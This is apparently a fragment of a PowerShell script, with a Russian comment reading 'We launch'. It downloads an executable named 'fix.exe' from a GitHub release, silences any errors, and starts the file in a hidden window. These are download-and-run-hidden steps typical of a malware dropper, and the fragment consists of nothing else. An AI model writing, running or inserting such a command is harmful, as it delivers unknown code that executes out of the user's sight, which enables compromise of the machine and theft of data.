Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "fix.exe" -WindowStyle Hidden

